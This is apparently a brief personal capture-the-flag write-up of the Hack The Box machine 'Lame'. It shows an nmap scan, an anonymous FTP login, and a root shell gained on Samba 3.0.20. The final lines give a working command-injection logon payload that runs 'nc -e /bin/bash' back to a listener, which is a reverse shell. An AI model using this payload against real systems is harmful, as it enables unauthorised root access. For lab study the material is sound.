# Lame

## where you at

10.10.10.3

## what you got

```
# Nmap 7.60 scan initiated Wed Jan 22 15:42:48 2020 as: nmap -oX - -sS -T4 -oN /home/justin-p/Documents/htb/Lame/scans/simple_tcp.nmap -oG /home/justin-p/Documents/htb/Lame/scans/simple_tcp.gnmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.028s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Wed Jan 22 15:42:58 2020 -- 1 IP address (1 host up) scanned in 10.11 seconds
```

## ftp

``` 
justin-p@FapTop:~/Documents/htb/Lame$ ftp -p 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:justin-p): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,10,10,3,176,200).
150 Here comes the directory listing.
226 Directory send OK
``` 

IPC Service (lame server (Samba 3.0.20-Debian))

```
justin-p@FapTop:~/Documents$ nc -nlvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.10.3 37851 received!
whoami
root

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@FapTop:~/Documents/htb/Lame# python smbtool.py 10.10.10.3
(logon “./=`nohup nc -e /bin/bash 10.10.14.7 9999`")
```